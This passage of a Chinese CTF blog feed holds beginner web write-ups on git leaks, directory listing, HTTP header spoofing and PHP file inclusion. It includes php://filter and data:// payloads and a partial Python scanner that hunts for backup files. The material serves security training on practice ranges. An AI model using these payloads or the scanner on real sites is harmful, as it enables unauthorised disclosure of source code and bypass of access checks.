<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014316448.png"
                      alt="image-20240913014316448"
                ></p>
<p>执行后会多出一些文件，既然.git都出来了，那就好说了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014504812.png"
                      alt="image-20240913014504812"
                ></p>
<p>但其实这里是没有我们需要的flag的</p>
<p>对没错，又是一个坑，我的另一篇<a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露">writeup</a>中，用的这个python2环境才能实现，而这道题要用python3环境的githack，所以之后还是两个都走一遍吧，谁知道呢</p>
<p>当我们用python3环境的githack时，目录中就有一些可以看得到的文件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015133582.png"
                      alt="image-20240913015133582"
                ></p>
<p>进去看看，哦，一看我们的flag就出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015202941.png"
                      alt="image-20240913015202941"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件使用后却和想要的结果完全不一样的时候，考虑一下版本问题以及查找资料，不要死磕（你又不是高手，啥都磕对身体不好๑乛◡乛๑）</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-目录遍历</title>
    <url>/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h1 id="信息泄露-目录遍历"><a href="#信息泄露-目录遍历" class="headerlink" title="信息泄露-目录遍历"></a>信息泄露-目录遍历</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，看到这样的页面，点进去就是一个个的目录，那我们就先试着手动找找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914222937043.png"
                      alt="image-20240914222937043"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223008793.png"
                      alt="image-20240914223008793"
                ></p>
<p>看着文件不多，一个一个找，然后就会在2-2里面找到flag，点开就是我们的flag了</p>
<blockquote>
<p>这里是目录不多，如果目录多的话建议用现呈的工具进行目录遍历，或者手搓一个</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223207919.png"
                      alt="image-20240914223207919"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题是目录浏览漏洞，是由于网站存在配置缺陷，存在目录可浏览漏洞，这会导致网站很多隐私文件与目录泄露，其实就是告诫我们服务器存储的时候不要漏了网站配置，不然自己的隐私文件就直接漏出来了，容易被黑客提权黑掉</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;目录遍历</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019 Http</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>开启靶场后，打开是一个普通页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912182741453.png"
                      alt="image-20240912182741453"
                ></p>
<p>上下翻找没有其他可利用的，直接上F12大法（或者crtl+U查看网页源代码）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183001262.png"
                      alt="image-20240912183001262"
                ></p>
<p>这里我是直接查看源代码，找到需要的<code>Secret.php</code>文件</p>
<blockquote>
<p>但有一个坑，这里需要左右拖动才能看到我们需要的</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183130513.png"
                      alt="image-20240912183130513"
                ></p>
<p>点击后可以看到需要从指定的网页<code>https://Sycsecret.buuoj.cn</code>打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183337334.png"
                      alt="image-20240912183337334"
                ></p>
<p>根据题目来看也是一个HTTP改包，可以通过<code>BurpSuite</code>来抓包（工具不限）</p>
<p>根据提示抓包后，添加<code>Referer:https://Sycsecret.buuoj.cn</code>伪造访问来源</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184441621.png"
                      alt="image-20240912184441621"
                ></p>
<p>Forward后看到还需要我们用<code>&quot;Syclover&quot;</code>浏览器，要有耐心，继续改包吧&#x3D;_&#x3D;，这次需要修改<code>User-Agent</code>来伪造访问，User-Agent协议表示的是用户访问的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184518595.png"
                      alt="image-20240912184518595"
                ></p>
<p>修改的位置随便，甚至可以把整个User-Agent删空再加一个Syclover，记得带上上一步修改的Referer协议</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184844862.png"
                      alt="image-20240912184844862"
                ></p>
<p>然后会得到让我们用本地访问（127.0.0.1），可以添加<code>X-Forwarded-For:127.0.0.1</code>，也可以添加<code>X-Client</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184941281.png"
                      alt="image-20240912184941281"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912185221699.png"
                      alt="image-20240912185221699"
                ></p>
<p>加上后再次返回，经过3次修改包，我们成功得到了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912185234356.png"
                      alt="image-20240912185234356"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇算是新手入门级别，成功水了一篇~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全目录</title>
    <url>/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
<p><a href="#ctfhub">ctfhub</a></p>
<p><a href="#buuctf">buuctf</a></p>
<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><ol>
<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" title="信息泄露-目录遍历">信息泄露-目录遍历</a></li>
<li><a href="/2024/09/16/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" title="信息泄露-备份文件下载">信息泄露-备份文件下载</a></li>
<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/" title="信息泄露-PHPINFO">信息泄露-PHPINFO</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/" title="信息泄露-Git泄露">信息泄露-Git泄露</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/" title="信息泄露-SVN泄露">信息泄露-SVN泄露</a></li>
<li><a href="/2024/09/17/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/" title="信息泄露-HG泄露">信息泄露-HG泄露</a></li>
<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/" title="RCE-eval执行">RCE-eval执行</a></li>
<li><a href="/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/" title="web前置技能-HTTP协议">web前置技能-HTTP协议</a></li>
</ol>
<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><ol>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/" title="极客大挑战2019 Http">[极客大挑战 2019]Http</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/" title="BUU BURP COURSE 1">BUU-BURP-COURSE-1</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/" title="web入门-粗心的小李">[web入门]粗心的小李</a></li>
<li><a href="/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/" title="BJDCTF2020 Mark-loves-cat*">[BJDCTF2020]Mark-loves-cat</a></li>
<li><a href="/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" title="BJDCTF2020 ZJCTF，不过如此*">[BJDCTF2020]ZJCTF-不过如此</a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全的做题思路及方法</title>
    <url>/2024/09/14/ctf/writeup/web/%E7%9B%AE%E5%BD%95/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="做题思路及方法"><a href="#做题思路及方法" class="headerlink" title="做题思路及方法"></a>做题思路及方法</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li><h3 id="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"><a href="#首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题" class="headerlink" title="首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题"></a>首先拿到题目，先看题目上是否有提示说明这个是关于哪一方面的，如果有，就针对这一方面进行测试和做题</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164659161.png"
                      alt="image-20240914164659161"
                ></p>
<ul>
<li>例如这种题目上有明显提示的，就根据提示来下手</li>
</ul>
</li>
<li><h3 id="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"><a href="#如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了" class="headerlink" title="如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了"></a>如果题目中没有给出细节，只给了一个页面网址，那么就要根据页面中的信息来了</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164903900.png"
                      alt="image-20240914164903900"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/image-20240914164924736.png"
                      alt="image-20240914164924736"
                ></p>
<ul>
<li><p>例如这种的题目，就什么都没有，靶场点开就是一个页面的</p>
<ul>
<li>先F12大法（ctrl+U也可以），查看有没有可以利用的信息</li>
<li>如果没有信息，再扫描目录文件</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此*</title>
    <url>/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此*"></a>[BJDCTF2020]ZJCTF，不过如此*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，这里直接给出了源码，接下来要做的第一步就是代码审计≡(▔﹏▔)≡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914183912618.png"
                      alt="image-20240914183912618"
                ></p>
<p>根据源码(..•˘_˘•..)</p>
<p>第一个if说明我们需要传入<code>text=I have a dream</code>才能进行下面的操作</p>
<p>下面一个if说明要传入一个<code>file</code>参数，不能传入flag字符防止直接拿到flag</p>
<p>后面可以看到有<code>include($file)</code>，并且后面加上了注释<code>next.php</code>，表明需要用php伪协议来包含文件，而文件基本就是<code>next.php</code></p>
<p>那具体怎么做呢？(•ิ_•ิ) </p>
<p>这里提供两种方法，一种是<code>data</code>伪协议，另一种是<code>php://input</code></p>
<blockquote>
<p>目前只提供如何提取出文件next.php，后续的涉及其他知识暂且放着，留个坑</p>
</blockquote>
<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>在<strong>BurpSuite</strong>里面，加上payload：<code>?text=data:text/plain,I have a dream</code></p>
<p>解第一步if不一样之外，其他后面的内容都一样，这里就不重复了，接着往下看吧</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>在<strong>BurpSuite</strong>里面，用<code>php://input</code>传入<code>I have a dream</code>给<code>text</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220642475.png"
                      alt="image-20240914220642475"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220604923.png"
                      alt="image-20240914220604923"
                ></p>
<p>这里只是完成了第一层if判断</p>
<p>接下来，对于要读取文件file参数，则传入<code>php://filter/read=convert.Base64-encode/resource=next.php</code>。</p>
<p>解释一下这串payload</p>
<ul>
<li>使用的是php的filter协议，用于数据过滤</li>
<li>read后面跟上需要使用的过滤器，而这里的过滤器就是<code>convert.Base64-encode</code>，表明调用Base64过滤器对文件内容进行编码再输出</li>
<li>resource后面接输入的文件，文件会被读取然后以Base64的形式输出</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221239456.png"
                      alt="image-20240914221239456"
                ></p>
<p>然后在改包的里面完成操作，读取next.php文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220915984.png"
                      alt="image-20240914220915984"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221658927.png"
                      alt="image-20240914221658927"
                ></p>
<p>取出这串字符，用Base64解码即可得到next.php文件，提供一个在线解码工具<a class="link"   href="https://www.toolhelper.cn/EncodeDecode/Base64" >锤子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221848920.png"
                      alt="image-20240914221848920"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221833561.png"
                      alt="image-20240914221833561"
                ></p>
<blockquote>
<p>之后的代码审计暂时不做，留个坑在这</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里需要掌握php的文件包含的知识，如果觉得自己不够掌握的推荐看一下<a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这里面基本涵盖了所有的情况，耐心阅读吧~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>待填坑</tag>
        <tag>writeup</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-备份文件下载</title>
    <url>/2024/09/16/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h1 id="信息泄露-备份文件下载"><a href="#信息泄露-备份文件下载" class="headerlink" title="信息泄露-备份文件下载"></a>信息泄露-备份文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-信息泄露-备份文件下载"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-备份文件下载-1">题目-网站源码</a></li><li class="tab"><a class="#信息泄露-备份文件下载-2">题目-bak文件</a></li><li class="tab"><a class="#信息泄露-备份文件下载-3">题目-vim缓存</a></li><li class="tab"><a class="#信息泄露-备份文件下载-4">题目-.DS_Store</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-备份文件下载-1"><h3 id="题目-网站源码"><a href="#题目-网站源码" class="headerlink" title="题目-网站源码"></a>题目-网站源码</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>

  </div>

<p>打开靶场看到有提示网站源码的备份文件信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916154942458.png"
                      alt="image-20240916154942458"
                ></p>
<p>而接下来就是添加网站后缀看看有哪些是被备份没删除的</p>
<p>这里提供两种办法</p>
<ol>
<li><p>自己编写脚本实现多线程访问，我提供一个自己写的脚本可以参考一下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line">url1 = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;2010&#x27;</span>, <span class="string">&#x27;2011&#x27;</span>, <span class="string">&#x27;2012&#x27;</span>, <span class="string">&#x27;2013&#x27;</span>, <span class="string">&#x27;2014&#x27;</span>, <span class="string">&#x27;2015&#x27;</span>, <span class="string">&#x27;2016&#x27;</span>, <span class="string">&#x27;2017&#x27;</span>, <span class="string">&#x27;2018&#x27;</span>, <span class="string">&#x27;2019&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;2020&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;2022&#x27;</span>, <span class="string">&#x27;2023&#x27;</span>, <span class="string">&#x27;2024&#x27;</span>, <span class="string">&#x27;2025&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;back&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;backups&#x27;</span>, <span class="string">&#x27;bak&#x27;</span>, <span class="string">&#x27;bbs&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;clients&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;com&#x27;</span>, <span class="string">&#x27;customers&#x27;</span>, <span class="string">&#x27;dat&#x27;</span>, <span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;engine&#x27;</span>, <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;faisunzip&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;joomla&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;master&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;members&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;old&#x27;</span>, <span class="string">&#x27;orders&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;store&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;vb&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>, <span class="string">&#x27;wp&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tgz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>, <span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.jar&#x27;</span>, <span class="string">&#x27;.war&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.sql&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.sql.gz&#x27;</span>, <span class="string">&#x27;.tar.tgz&#x27;</span>]</span><br><span class="line"><span class="comment"># 定义一个函数来进行请求，并检查状态码</span></span><br><span 